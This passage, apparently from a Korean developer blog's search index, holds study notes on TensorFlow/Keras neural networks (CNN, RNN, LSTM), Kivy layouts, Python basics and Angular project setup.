loss\u0026#39;)\rplt.legend(loc=\u0026#39;best\u0026#39;)\rplt.show() FC layer를 사용하여 이미지 학습을 한 것 보다 CNN을 활용하여 학습을 한 것이 over-fitting 및 오차가 더 적음을 확인할 수 있다. CNN으로 이미지를 학습시키는게 더 효율적이다. RNN Recurrent Neural Network 로, 시계열 데이터를 처리하기 위한 모델이다.\n이전 데이터가 아후 데이터에 영향을 주는 데이터를 시계열 데이터라 한다. 데이터가 순서대로 입력되었을 때, 앞서 받은 데이터 처리 결과값을 잠시 기억해 놓는 방법을 사용한다.\n하나의 layer의 node간 연결되는 edge가 생긴다. 한 layer안 node들을 cell이라 칭한다. cell간 연결된 edge에는 \u0026lsquo;hidden_state\u0026rsquo; 데이터가 전달된다. x1 → [A1] → h1\rWhh ↓ h1\rx2 -Wxh→ [A2] → h2\r↓ h2\rx3 → [A3] → h3 RNN 에서 한 layer 내부의 node간 edge에 있는 weight는 hyperbolic tangent를 이용한다. h_t = f(h_t-1, x_t) = tanh(x) = tanh(W_hh * h_t-1 + W_xh * x_t)\nRNN 모델링 RNN 모델은 \u0026lsquo;3 tensor\u0026rsquo;를 사용한다. 3 tensor의 각 요소는 아래와 같다. batch : 데이터 set의 개수 time step : 데이터 한 set에서 데이터의 개수 input dimension : 입력 데이터를 one-hot encoding 했을 때 크기 output, hidden_state = SimpleRnn(3, return_state=True, return_sequences=True)(input) : 결과값으로 크기 3인 데이터를 반환 input으로는 3차원 배열이 필요, batch, time step, input dimension 을 고려한 형태 return_sate가 true이면 output을 반환, 아니면 hidden_state(마지막시점 state)만 반환 return_sequences가 true면 output으로 3차원 값 (각 batch별 학습결과)를 전달, false면 2차원(최종 결과)를 반환 hidden_state 에는 LSTM RNN은 gradient에 의한 vanishing 문제가 크다. 이를 개선하기 위한 모델이 LSTM 이다. Long Short Term Memory, 중요한 데이터는 길게 기억하고 중요하지 않은 데이터는 짧게 기억한다. 데이터를 다음 cell에 넘길지 말지 판단하는 절차를 거친다. LSTM에서는 \u0026lsquo;hidden_state\u0026rsquo;에 더해 \u0026lsquo;cell_state\u0026rsquo; 값을 추가로 전달한다. cell_state 는 과거로부터 전달되는 값들을 유지할 수 있도록 한다. LSTM 에서는 Gate 가 추가된다. 데이터를 얼마나 통과할지 필터링 해주는 역할이다. 총 3개(forget, input, output)의 gate가 있다. 각각 데이터를 얼마나 잊을지, 입출력으로 들어온 데이터 양 조절을 관장한다. Gate Input Gate 최종 cell_state에 현재 cell의 cell_state 값을 얼마나 적용할지 설정 i_t = σ(W_i * [h_t-1, x_t] + b_i) : hidden_state와 입력값에 input gate의 weight, bias를 적용한 후 sigmoid를 취함. Forget Gate sigmoid 함수로 cell_state 값을 얼마나 통과시킬지 설정 forget gate도 weight와 bias가 존재한다. (W_f, b_f) f_t = σ(W_f * [h_t-1, x_t] + b_f) : hidden_state와 입력값에 forget gate의 weight, bias를 적용한 후 sigmoid를 취함. Output Gate 최종 cell_state 값으로 최종 hidden_state 값이 얼마나 출력될지 결정\no_t = σ(W_o * [h_t-1, x_t] + b_o) : hidden_state와 입력값에 output gate의 weight, bias를 적용한 후 sigmoid를 취함.\nC_t = f_t * C_t-1 + i_t * C'_t : 최종 cell_state는 (forget gate를 통과한 이전 cell_state) + (hidden_state와 입력값으로 hidden_state를 계산하고, input gate를 통과시킨 값)이다.\nC'_t = tanh(W_c * [h_t-1, x_t] + b_c) : C\u0026rsquo;_t 값은 입력값과 hidden_state로 현재 cell의 cell_state를 구하는 식이다. 이를 input gate에 통과시키면 i_t * C'_t 값이 된다. C_t-1 은 이전 cell에서 받은 cell_state 이다. 이를 forget gate에 통과시키면 f_t * c_t-1 값이 된다. h_t = o_t * tanh(C_t) : 최종 cell_state 를 hyperbolic tangent 취한 값에 output gate를 적용하면 최종 hidden_state 값이 결정된다.\nLSTM은 기본 RNN보다 복잡하지만 훨씬 더 좋은 성능을 낼 수 있다.\n모델 딥 러닝을 위한 신경망 구조를 모델이라 한다 모델 정의 방법과 최적화 x 데이터는 attribute, y 데이터는 class라 칭한다. 입력층, 은닉층, 출력층 구성 아래 내용들은 일반적인 경우에 해당하는 경우이므로, 실제 모델 정의시에는 직접 확인해볼 필요가 있다. 데이터에 맞게 입력층의 node 개수를 결정한다. 얕은 신경망보다 심층 신경망이 효율적인 파라미터를 구성한다. (하나씩 layer를 늘려가 본다.) 은닉층의 노드 개수를 입력 노드 개수보다 많이 편성한다. (무조건은 아니므로 확인 필요) 결정할 수 있는 데이터를 조금씩 줄여 깔때기 모양으로 은닉층을 설정하는게 좋다. (갈수록 node 개수를 줄여감) 첫 은닉층의 노드 개수는 과대적합(over fitting)이 시작되기 전까지 뉴런 수를 점진적으로 늘리는 것이 좋다. 은닉층이 많아질수록 ReLU 함수를 사용하는것이 좋다.(vanishing 현상 방지) 출력층의 활성화 함수를 결정하고, 출력층의 활성화 함수에 따라 오차함수도 결정한다. 둘중 하나를 선택한다면 sigmoid 함수와 binary_crossentropy 를 사용한다. 다중분류 모델링 데이터의 속성에 맞게 입력 node의 수 구성 문자열로 된 class 값을 indexing 하고, one-hot-encoding으로 값을 변형해준다. class의 개수에 맞게 출력층 node 개수를 설정한다. 활성화 함수 및 오차방정식으로 softMax와 categorical cross-entropy를 적용한다. 생성 방법 tensorflow.keras.Sequential : Sequential 함수를 이용하는 방법 functional approach : 직접 함수를 구성하는 방법 tensorflow.keras.Model : Model 클래스를 상속하고 재정의하여 사용하는 방법 Keras.Sequential keras를 이용해서 sequential 모델을 생성하는 방법 model = Sequential() : sequential 한 layer 형태를 가진 모델을 생성 model.add(Dense(units =2, activation='sigmoid', input_dim = 2)) : layer 추가 node 수가 2개 activation function이 sigmoid 입력값이 2차원 형태 input_dim 인자는 첫번 째 layer에만 사용해 주면 된다. model.compile(loss='binary_crossentropy', optimizer='sgd', metrics=['accuracy']) : model 객체를 어떤 형태로 학습시킬지 정의 binary_crossentropy 를 loss function으로 설정 optimizer로 sgd 설정 실행될 때 마다 loss 값과 accuracy 값을 출력으로 보여줌 result = model.fit(x_train, y_train, epochs=50000, batch_size = 10, validation_split=0.3) : model에 training 실행 x_train, y_train : 학습용 x, y 데이터 epochs : 학습 데이터를 통해 반복 학습시킬 횟수 batch_size : 입력 데이터를 몇 묶음 단위로 전달할지 설정, 하나씩 학습하는 것 보다 학습률 출렁임이 더 안정적이다. validation_split : 데이터중 0.3%는 검증용으로 사용, \u0026lsquo;validation_data\u0026rsquo; 로 직접 데이터를 전달할 수도 있음 result : result.history 에서 \u0026rsquo;loss\u0026rsquo;, \u0026lsquo;val_loss\u0026rsquo;, \u0026lsquo;accuracy\u0026rsquo;, \u0026lsquo;val_accuracy\u0026rsquo; 키워드로 loss, accuracy 값 확인 가능 model.layers[0].get_weights()[0] : model.layers 는 입력 layer을 0번째 index로 하여 특정 layer를 반환 get_weights() 는 해당 layer의 [weight, bias] 를 담고 있는 배열을 반환 model.predict(x_predict) : 학습된 모델에 x_predict 값을 넣을 시 특정 y 값을 추정하여 반환하는 함수 model.evaluate(x_data, y_data) : 학습된 모델에 입력값(x_data)과 정답(y_data) 를 전달받아 [loss, accuracy] 를 반환하는 함수 ","permalink":"https://aswinblue.github.io/Blog/post/machinelearning/tensorflow/","summary":"#Tensorflow\nTensorFlow는 구글에서 수치연산을 위해 만든 라이브러리이다. 기본 개념 node와 edge로 구성된 graph를 이용해 수치 연산을 수행한다. node들은 특정한 데이터가 들어오면 연산을 수행하거나, 형태를 변경하거나, 결과를 출력하는 역할을 한다.\nedge는 학습데이터가 저장되는 다차원 배열이다.\nedge는 node에서 계산된 데이터를 다음 node로 이동시킨다.\nedge는 방향성이 있으며(directed), tensor라 불린다.\narchive.ics.uci.edu/ml 에서 학습용 데이터를 받아 사용할 수 있다.\n설치 python과 pip를 설치한다. pip install tensorflow 명령을 수행한다. window에서 \u0026lsquo;client_load_reporting_filter.h\u0026rsquo; 파일을 찾지 못해 설치를 못했다면, path 경로가 너무 길어서 발생하는 오류이다.","title":"Tensorflow"},{"content":"#kivy\nBasic concepts Widget 어플리케이션을 구성하는 객체 widget은 다른 widget을 tree형태로 포함 가능하며 버튼, 라벨 등상호작용 가능한 객체 또는 Widget의 집합 위치는 좌표로 표현되는데 좌표는 좌측하단이 (0,0)이다. Layout 화면 구성을 설정한 요소 widget 혹은 layout을 포함 가능하다. structure main.py에 python으로 내용을 작성한다. class TheLabApp(App):\rpass\rTheLabApp().run() main.py에서 선언한 class \u0026lsquo;TheLabApp\u0026rsquo; 에서 App을 뺀 TheLab을 따서 main.py와 같은 경로에 \u0026lsquo;TheLab.kv\u0026rsquo;파일을 생성한다. /\r|-main.py\r|-TheLab.kv .py파일에서 원하는 layout class를 상속받아 객체를 구성할 수도 있고, .kv파일에서 바로 작성할 수도 있다. 단, .kv파일에서 객체를 생성하려면 .py파일에 정의된 class를 사용해야 한다. \u0026lt;EXAMPLE@BoxLayout\u0026gt; 와 같이 .py파일의 class 선언을 생략하고 default 객체를 사용하는 방법도 있다. ///////// .py /////////\rclass Box(BoxLayout):\rpass\r///////// .kv /////////\r\u0026lt;Box\u0026gt;: # .py에서 정의된 Box객체를 사용 가능\rGridLayout: # 이후부터는 kivy에서 제공하는 객체들 사용 가능\rlabel:\rtext:\u0026#34;lb\u0026#34;\r\u0026lt;Box2@BoxLayout\u0026gt;: # .py파일에서 아무것도 하지 않는 객체를 선언하기 싫을 때 사용\r/////////////////////// ex) class 안에서 속성 설정 :self.orientation = \u0026quot;vertical\u0026quot; ex) kv파일에서 속성 설정 : orientation: \u0026quot;vertical\u0026quot; \u0026lt;NAME\u0026gt;형태로 선언한 객체는 다른 객체에서 사용할수 있게 된다. \u0026lt;Box\u0026gt;:\r...\r\u0026lt;Box2\u0026gt;:\rButton:\r...\rBox: # 사용자 정의 객체\r... .kv파일은 아래와 같이 구성된다. 화면을 구성하는 내용들의 속성을 정의하고 배치할 수 있다. MainWidget: # 화면에 표기할 객체(widget, layout, \u0026hellip;) : # widget 정의 Button: # widget 내부 항목 선언, kivy에서 지원하는 객체의 종류 text:\u0026ldquo;A\u0026rdquo; Button: text:\u0026ldquo;B\u0026rdquo;\n- .py파일에서도 화면을 구성할 수 있다. class LayoutExample(BoxLayout): # BoxLayout은 기본적으로 가로로 구성된다. def init(self, **kargs):\nsuper().init(**kargs) b1 = Button(text=\u0026ldquo;A\u0026rdquo;) # 객체를 생성 b2 = Button(text=\u0026ldquo;B\u0026rdquo;) self.add_widget(b1) # 객체를 layout에 추가 self.add_widget(b2)\nUsage layout BoxLayout 가로 혹은 세로로 차곡차곡 쌓아가는 레이아웃 AnchorLayout 화면의 각 모서리, 꼭지점, 정중앙 총 9개의 위치를 지정할 수 있는 레이아웃 GridLayout n행m열의 그리드를 나누고, 내용을 채우는 레이아웃 StackLayout n행m열의 표에 좌측상단부터 차곡차곡 쌓아가는 레이아웃. BoxLayout의 2차원형태 ScrollView 상하 또는 좌우로 스크롤이 가능한 화면 PageLayout 디스플레이간 slide를 통해 이동이 가능한 레이아웃 FloatLayout RelativeLayout ScatterLayout Commons size_hint : 레이아웃 내 객체의 비율 설정 layout 안의 객체는 size 조절이 불가능하다. (size: 설정 해도 적용 안됨) size_hint 값이 default로 설정되어있기 때문이다. size_hint값이 적용된 객체는 화면 크기에 따라 객체 크기도 함께 변경된다. size_hint값은 default 1,1로 설정되어있다. size_hint: None, None으로 설정한다면 size: 값을 설정할 수 있다. (화면 크기에 상관없이 고정된 크기를 가질 수 있게 된다.) ex) spacing:\u0026quot;10dp\u0026quot; : layout내부 요소간 간격 설정 BoxLayout orientation: \u0026quot;vertical\u0026quot;: 세로정렬(가로 : \u0026ldquo;horizontal\u0026rdquo;) \u0026lt;BoxLayoutSample\u0026gt;:\rorientation: \u0026#34;vertical\u0026#34;\rButton:\r# 배정받은 크기에 대해 가로비율 50%, 세로비율 60%로 설정.\rtext: \u0026#34;b1\u0026#34;\rsize_hint: .5, .6 AnchorLayout ahcnor_x:\u0026quot;center\u0026quot;: x축 정렬 위치, left, right, center 가능, default center ahcnor_y:\u0026quot;center\u0026quot;: y축 정렬 위치, top, bottom, center 가능, default center 객체를 순서대로 쌓는것이 아니라 지정한 자리에 그대로 넣는것이므로, 이전 객체는 이후에 나오는 객체에 덮어씌워질 수 있음 \u0026lt;AnchorExample\u0026gt;:\rButton:\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .2, .2\rpos_hint:{\u0026#34;X\u0026#34;:.1, \u0026#34;Y\u0026#34;: .1}\rButton:\rtext:\u0026#34;btn2\u0026#34;\rsize_hint: .1, .1\rpos_hint:{\u0026#34;X\u0026#34;:.5, \u0026#34;Y\u0026#34;: .5} GridLayout rows: Grid의 행 개수를 선언한다. default 1 cols: Grid의 열 개수를 선언한다. default 1 size_hint로 내부 요소의 비율을 조절하고 싶을 때, 같은 행/열에 속한 값들도 모두 같은 값으로 설정해야 적용이 된다. 설정한 Grid를 초과하는 객체를 선언하면 Widget에서 객체를 생성한것으로 취급된다. \u0026lt;GridExample@GridLayout\u0026gt;:\rrows: 2\rcols: 3\rButton: # 0,0\rtext: \u0026#34;btn\u0026#34;\rsize_hint: .5, 1 # 비율 조정\rButton: # 0,1\rtext: \u0026#34;btn\u0026#34;\rsize_hint: None, 1\rwidth:\u0026#34;100dp\u0026#34; # 고정된 크기\rButton: # 0,2\rtext: \u0026#34;btn\u0026#34;\rButton: # 1,0\rtext: \u0026#34;btn\u0026#34;\rsize_hint: .5, 1\rButton: # 1,1\rtext: \u0026#34;btn\u0026#34;\rsize_hint: None, 1\rwidth:\u0026#34;100dp\u0026#34; # 고정된 크기\rButton: # 1,2\rtext: \u0026#34;btn\u0026#34;\rButton: # out of bound\rtext: \u0026#34;btn\u0026#34;\rpos:100, 200 StackLayout 내부 객체들을 가로 한줄로 나열한다. 한 줄에 있는 객체들의 비율이 100%를 넘어가면 다음줄부터 객체를 채워넣는다. 가로 혹은 세로는 가장 큰 크기의 객체에 맞춰져 grid형식으로 정렬된다. \u0026lt;StackExample\u0026gt;:\rButton:\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .3, .3\rButton:\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .3, .4\rButton:\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .3, .5\rButton: # 가로비율이 1을 넘어가기때문에 줄바뀜됨\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .3, .5\rButton:\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .4, .5\rButton:\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .3, .5\rButton: # 세로 비율상으로 1을 넘어가기 때문에 화면 밖으로 나가서 보이지 않음\rtext:\u0026#34;btn\u0026#34;\rsize_hint: .3, .5 고정된 크기로 wiwdget을 추가하면 화면 크기가 변함에 따라 widget의 행,열이 변경된다. class로 설정을 할 수도 있다. 이때 class의 __init__에 설정한 내용이 .kv파일에서 설정한 내용보다 우선하여 적용된다. class StackExample(StackLayout):\rdef __init__(self, **kwargs):\rsuper().__init__(**kwargs)\rfor i in range(0, 10):\rsize = dp(100) # dp로 크기 선언법\rb = Button(text=str(i + 1), size_hint=(None, None), size=(size, size)) # 버튼 세팅\rself.add_widget(b) # layout에 widget 추가 Widgets 기본크기 100 X 100, 기본위치 (0,0) 이다. Commons pos_hint: 정렬 위치 size_hint등으로 비율을 조절하면 기본적으로 좌측 상단으로 정렬이 된다. 이때, 다른 방향으로 정렬을 하려면 pos_hint:{\u0026quot;x\u0026quot;:.5, \u0026quot;y\u0026quot;:.5}와 같이 설정 가능하다. pos_hint: 다음에는 dictionary가 와야하며, 두 개의 항목이 들어간다. 첫번째 인자는 \u0026ldquo;x\u0026rdquo;, \u0026ldquo;center_x\u0026rdquo;, \u0026ldquo;right\u0026rdquo; 중 하나를 사용하며, 두번째 인자는 \u0026ldquo;y\u0026rdquo;, \u0026ldquo;center_y\u0026rdquo;, \u0026ldquo;top\u0026rdquo; 중 하나를 사용한다. pos_hint:{\u0026#34;x\u0026#34;:.5} # 좌측부분을 50%위치로 설정\rpos_hint:{\u0026#34;center_x\u0026#34;:.5} # 중앙을 50%위치로 설정\rpos_hint:{\u0026#34;right\u0026#34;:.5} # 우측부분을 50%위치로 설정 Button 텍스트, 크기, 위치를 지정한 버튼 아래쪽에 있는 내용이 나중에 그려져 이전 내용을 덮어씌운다. MainWidget:\r\u0026lt;MainWidget\u0026gt;:\r# 고정 크기를 가진 버튼\rButton:\rtext: \u0026#34;Hello\u0026#34;\rsize: 400, 200\rpos: 100, 200\r# 기기 화면 크기에 따른 크기와 위치를 가진 버튼\rButton:\rtext: \u0026#34;hello2\u0026#34;\rsize: \u0026#34;400dp\u0026#34;, \u0026#34;200dp\u0026#34;\rpos: \u0026#34;100dp\u0026#34;, \u0026#34;200dp\u0026#34; lalbel 텍스트, 크기, 위치, 글자색을 지정한 레이블 MainWidget:\r\u0026lt;MainWidget\u0026gt;:\rLabel:\rtext: \u0026#34;Hello\u0026#34;\rsize: \u0026#34;100dp\u0026#34;, \u0026#34;80dp\u0026#34;\rpos: \u0026#34;100dp\u0026#34;\rcolor: 1, 2, 3, 1 # r, g, b, a 기타 .kv파일에서 동일한 이름의 객체를 여러개 정의하면, 하나의 정의로 보고 내용을 이어붙인다. \u0026lt;BoxLayoutSample\u0026gt; # layout 정의\rButton:\rtext:\u0026#34;A\u0026#34;\rsize_hint: \u0026#34;.1\u0026#34;\r...\r\u0026lt;BoxLayoutSample\u0026gt; # 동일한 이름의 layout 정의\rButton:\rtext:\u0026#34;B\u0026#34; #버튼 B는 버튼 A 다음에 생성됨\rsize_hint: \u0026#34;.1\u0026#34; .py 에서 class를 선언하고, .kv파일에서 해당 class를 사용한다면, .py의 init() 함수가 먼저 호출된 후 .kv파일에서 세팅한 내용이 적용된다. 참조 유튜브 강의 import:\nfrom kivy.app import App\rfrom kivy.uix.button import Button\rfrom kivy.uix.boxlayout import BoxLayout\rfrom kivy.uix.widget import Widget ","permalink":"https://aswinblue.github.io/Blog/post/windowapp/kivy/","summary":"#kivy\nBasic concepts Widget 어플리케이션을 구성하는 객체 widget은 다른 widget을 tree형태로 포함 가능하며 버튼, 라벨 등상호작용 가능한 객체 또는 Widget의 집합 위치는 좌표로 표현되는데 좌표는 좌측하단이 (0,0)이다. Layout 화면 구성을 설정한 요소 widget 혹은 layout을 포함 가능하다. structure main.py에 python으로 내용을 작성한다. class TheLabApp(App):\rpass\rTheLabApp().run() main.py에서 선언한 class \u0026lsquo;TheLabApp\u0026rsquo; 에서 App을 뺀 TheLab을 따서 main.py와 같은 경로에 \u0026lsquo;TheLab.kv\u0026rsquo;파일을 생성한다. /\r|-main.py\r|-TheLab.kv .py파일에서 원하는 layout class를 상속받아 객체를 구성할 수도 있고, .","title":"Kivy"},{"content":"Python 기본 내장 함수 입력 한줄 받기 : a = input()\n받은 값은 string 형태이다.\n받은 단어 끊어서 해석 : a, b = input().split() split() 함수 안의 인자에 따라 구분자 설정 가능. 빈칸이면 공백을 기준으로 끊어줌\n받은 단어 끊고 숫자로 변환 : a, b = map(int, input().split()) int 외 다른 형태도 사용 가능 출력 print() 와 sys.stdout.write() 로 화면에 출력할 수 있다. sys.stdout.write 안에는 string 형태만 적용할 수 있다. print 안에는 수식 등으로 string 및 byte를 표현 가능하다. sys.stdout.buffer.write() 를 사용하면 문자열을 수식을 통해 조합하고 ascii 코드 형태로 출력 가능하다. print() 를 사용하면 prefix가 붙어서 원하는 형태를 표현하기 어렵다. 이럴 때 sys.stdout.buffer.write()를 사용한다. ex) sys.stdout.write(b\u0026#39;A\u0026#39;*0x10 + b\u0026#39;B\u0026#39;*0x20 + b\u0026#39;\\xaa\\\rxbb\\xcc\\xdd\\x00\\x00\\x00\\x00\u0026#39;)\r# 결과: AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB����\rsys.stdout.write(b\u0026#39;A\u0026#39;*0x10 + b\u0026#39;B\u0026#39;*0x20 + b\u0026#39;\\xaa\\ xbb\\xcc\\xdd\\x00\\x00\\x00\\x00\u0026rsquo;) # 결과: b\u0026rsquo;AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\xaa\\xbb\\xcc\\xdd\\x00\\x00\\x00\\x00\u0026rsquo; ```\nFlush print() 함수는 효율을 위해 버퍼에 내용을 채워놓고 있다가 버퍼가 일정량 채워지면 화면에 버퍼의 내용을 출력한다. print() 함수에는 bool 형태의 인자 flush 를 받을 수 있는데, flush를 True로 설정하면 버퍼가 찰 때 까지 대기하지 않고 바로 출력할 수 있다. ex) print(\u0026quot;print this immediately\u0026quot;, flush=True) sys 모듈의 sys.stdout.flush() 함수를 사용하여 동일한 효과를 낼 수 있다. python을 실행할 때, -u 옵션을 넣어서 실행하면 내부적으로 표준 출력이 모두 버퍼링 없이 즉시 flushing 된다. 함수 함수 인자로 배열 형태를 표현할 때 *를 붙인다.\ndef func1(*arg)\rprint(*arg)\rfunc1(1, 2, 3) # 출력: [1, 2, 3] 숫자 읽기쉬운 숫자 표기: x = 10000 vs x = 10_000\n숫자 정의할 때 _를 중간에 넣어도 python은 숫자만 골라서 해석한다. 배열 오름차순 정렬: list.sort()\n튜플 두번째 인자 기준 오름차순 정렬: list.sort(key=lambda x:x[1])\n내림차순 정렬 : list.sort(reverse=True)\n문자열 문자열 뒤에 format() 함수를 호출해서 문자열 안에 {} 를 변수로 치환할 수 있다.\nex) \u0026quot;sample text {} {}\u0026quot;.format(\u0026quot;var1\u0026quot;, \u0026quot;var2\u0026quot;) 은 sample text var1 var2 으로 출력된다. 문자열.ljust(num, f) : 문자열의 길이가 \u0026rsquo;num\u0026rsquo;이 될 때 까지 우측에 f 문자를 집어넣음\nex) \u0026ldquo;HELLO\u0026rdquo;.ljust(10,\u0026rsquo;#\u0026rsquo;) =\u0026gt; HELLO##### 문자열.rjust(num, f) : 문자열의 길이가 \u0026rsquo;num\u0026rsquo;이 될 때 까지 좌측에 f 문자를 집어넣음\nex) \u0026ldquo;HELLO\u0026rdquo;.rjust(10,\u0026rsquo;#\u0026rsquo;) =\u0026gt; #####HELLO 라이브러리 numpy 기본 구문\nwhere(조건, 값1, 값2): 조건문이 참이면 값1, 거짓이면 값2를 반환. 3항연산자와 동일 bisect 오름차순으로 정렬된 배열에서 lower-bound, upper-bound 를 찾는 함수 bisect_left(list, x, key) : lower bound (x보다 같거나 큰 수들 중 최좌측 값의 위치)\nbisect_right(list, x, key) : upper bound (x보다 같거나 작은 수들 중 최우측 값의 위치)\n또는 lower bound (lower bound 를 찾았는데 동일 값이 존재할 경우 최우측 값의 위치)\nbisect(list, x, key) : bisect_right와 동일 tueple 적용 방법 : bisect(list_of_tuples, (3, None)) 형태로 사용하면 된다. 두 번째 인자에 튜플 형태를 넣어주면 됨. https://stackoverflow.com/questions/20908047/using-bisect-in-a-list-of-tuples\n","permalink":"https://aswinblue.github.io/Blog/post/python/python_basic/","summary":"Python 기본 내장 함수 입력 한줄 받기 : a = input()\n받은 값은 string 형태이다.\n받은 단어 끊어서 해석 : a, b = input().split() split() 함수 안의 인자에 따라 구분자 설정 가능. 빈칸이면 공백을 기준으로 끊어줌\n받은 단어 끊고 숫자로 변환 : a, b = map(int, input().split()) int 외 다른 형태도 사용 가능 출력 print() 와 sys.stdout.write() 로 화면에 출력할 수 있다. sys.stdout.write 안에는 string 형태만 적용할 수 있다. print 안에는 수식 등으로 string 및 byte를 표현 가능하다.","title":"Python 기초"},{"content":"Angular Angular JS와 Angular는 다르다. Angular JS는 초창기 Angular를 의미하고, 그냥 Angular는 Angular2 이상의 버전을 의미한다. javascript기반의 textscript를 사용한다. 확장자가 ts로 끝난다. 개발환경 세팅 nodejs 설치 $ sudo apt install npm :nodejs와 npm 동시에 설치 angular client 설치 $ npm install -g @angular/cli 명령어를 이용하여 설치 workspace 생성 client 설치가 완료되었으면 workspace를 생성하고 application을 생성한다.\n$ ng new \u0026lt;application_name\u0026gt; 명령어를 이용하여 설치한다.\nnodejs 버전이 낮다고 한다. github에서 받아서 빌드하여 써 보자.\n공식 사이트는 https://github.com/nodejs 이다.\n소스코드를 받아 빌드하는 내용은 없고, 바로 바이너리를 다운받기를 권장하는 듯 하다.\nhttps://nodejs.org/en/download/ 로 가서 리눅스용 바이너리를 받아보자.\n.xz 형태의 파일이다. $ tar -xvf \u0026lt;file_name\u0026gt; 로 압축을 푼다.\n압축을 푸니 안의 내용들이 /usr/lib/ 경로에 어울릴 것 같다. mv 명령으로 옮겨준다.\nbin 폴더 안의 내용은 링크로 /usr/local/lib/ 에 넣어준다.\nln -s /usr/lib/\u0026lt;file\u0026gt;/bin/\u0026lt;binary\u0026gt; /usr/local/lib/bin/\u0026lt;binary\u0026gt;\n다시 돌아와서 명령어를 수행하여 application을 생성한다. stylesheet format을 선택하라고 하는데, 가장 위에있는 CSS로 선택해 본다.\napplication 실행 application을 생성하면 현재 경로에 \u0026lt;application_name\u0026gt;에 해당하는 폴더가 생성된다. 테스트용으로 application을 실행해 보자. $ng serve --open 4200 포트로 서버 접속이 가능함을 알 수 있다. 방화벽 설정 방화벽이 아직 열려있지 않은 것 같다. 방화벽을 열어보자. iptables -I INPUT 1 -p tcp \u0026ndash;dport 12345 -j ACCEPT $sudo ufw allow 4200/tcp 프로젝트 구조 WORKSPACE src app : 화면을 구성하는 요소들의 root component, WORKSPACE와 같은 이름 \u0026lt;COMPONENT\u0026gt; : root component의 일부를 구성하는 component, 원하는만큼 추가 가능, [css, html, ts] 항목들이 기본 세트로 생성됨 COMPONENT.component.css : 기본적으로 비어있다. COMPONENT.component.html COMPONENT.component.ts : type script로 짜여진 코드, class들이 정의되어 있다. app.component.css app.component.html app.component.ts app.module.ts component view라는 단위의 화면을 구성하는 모듈 ng generate component COMPONENT_NAME 명령으로 workspace에 component 생성 가능 component를 생성하면 css, html, ts파일을 기본적으로 갖는다. component는 다른 component를 가질 수 있다. 최상위 component를 root component라고 한다. ts 파일 angular에서 제공하는 모듈을 import할 수 있다. class를 선언하고, component에서 사용할 기능(함수)을 구현한 후 export한다. component가 생성될 때 상위 component로 부터 input을 받을 수 있다. ts파일 문법 Component : Component를 사용하기 위한 기본 모듈 OnInit : Component 시작시 동작 정의, constructor 와 유사한 동작을 하지만 OnInit은 angular가 관할하고, constructor은 js가 관할하여 초기화하는 차이가 있다. Input : Component 생성시 상위 Component로 부터 받을 변수를 선언, 상위 Component에서는 해당 변수로 값을 집어넣어 줄 수 있다. Output : 상위 Component에서 사용할 수 있는 변수를 정의, Component에서 변수를 선언하면 상위 Component에서 해당 변수를 사용할 수 있다. @component 로 다음 class가 컴퍼넌트임을 표시한다. selector : 해당 component가 view에서 어떤 이름으로 표시될지 명명한다. (Tag 이름이 된다.) templateUrl : html 파일의 이름을 지정한다 styleUrls : css파일의 리스트를 나열한다. @Input() product; // product라는 변수로 input을 받겠다는 선언\r@Output() notify = new EventEmitter(); // notify 라는 변수를 상위 Component에서 사용 가능하게 하겠다고 선언\r// 한 component에서 다른 component를 호출할 때에는 ts 파일에서 정의한 이름을 태그로 생성한다.\r\u0026lt;app-product-alerts // 태그 이름이 곧 component 이름(selector에 정의한)이다.\r[product]=\u0026#34;product\u0026#34; // product라는 변수에 \u0026#34;product\u0026#34;라는 내용을 을 넣을 때 사용한다.\r(notify)=\u0026#34;onNotify()\u0026#34;\u0026gt; // notify라는 변수에서 이벤트가 들어오면 onNotify() 함수를 실행, (onNotify() 함수는 class 안에 정의되어 있어야 함)\r\u0026lt;/app-product-alerts\u0026gt; Routing app.modules.ts(main component의 ts파일) 파일에서 routing 설정이 가능하다. import { RouterModule } from \u0026#39;@angular/router\u0026#39;; // Routing을 위해 필요한 모듈\rimport { ProductListComponent } from \u0026#39;./product-list/product-list.component\u0026#39;;` // ProductListComponent라는 변수에 \u0026#39;./product-list/product-list.component파일을 대응\rimport { ProudctDetailsComponent } from \u0026#39;./product-detail/product-detail.component\u0026#39;;\r@NgModule({\rimports: [\rBrowserModule,\rReactiveFormsModule,\rRouterModule.forRoot([ // Router 모듈로 Routing 세팅\r{ path: \u0026#39;\u0026#39;, component: ProductListComponent }, // root 경로 \u0026#39;/\u0026#39; 에 위에서 ProductListComponent 변수에 대응시킨 파일을 매칭\r{ path: \u0026#39;products/:productId\u0026#39;, component: ProductDetailsComponent }, // 마찬가지로 \u0026#39;/products/{productId}\u0026#39; 에 ProudctDetailsComponent를 매칭\r])\r], ./product-detail/product-detail.component.ts 에서 아래와 같은 설정을 추가로 해주어야 한다. import { ActivatedRoute } from \u0026#39;@angular/router\u0026#39;; // routing을 당하는 곳에서 필요한 모듈\rexport class ProductDetailsComponent implements OnInit { // component 를 정의할 class 선언\rproduct; -\u0026gt; product 변수 선언\rconstructor(private route: ActivatedRoute,) // 라우팅 관련 정보를 route라는 변수에 받았다.\r{ } -\u0026gt; constructor 뒤에 붙여주는 형식, 비어있는 채로 둔다.\r}\rngOnInit() { // view 생성시 동작을 정의\rthis.route.paramMap.subscribe(params =\u0026gt; { // constructor에서 정의한 route를 참조하여\rthis.product = products[+params.get(\u0026#39;productId\u0026#39;)]; // this.product는 products[index] 값을 가진다. 이때 index는 app.modules.ts에서 설정한 값이다. (url 경로에서 \u0026#39;products/\u0026#39; 다음에 들어간 숫자값)\r});\r} ./product-detail/product-detail.component.html 에서 아래와 같이 설정한다. \u0026lt;h2\u0026gt;Product Details\u0026lt;/h2\u0026gt;\r\u0026lt;div *ngIf=\u0026#34;product\u0026#34;\u0026gt; // product에 값이 들어가 있다면 아래 수행. 즉, ts파일에서 대입시킨 products[idx] 값이 존재하면 아래 동작 수행\r\u0026lt;h3\u0026gt;{{ product.name }}\u0026lt;/h3\u0026gt; // json 형태의 값을 참조해 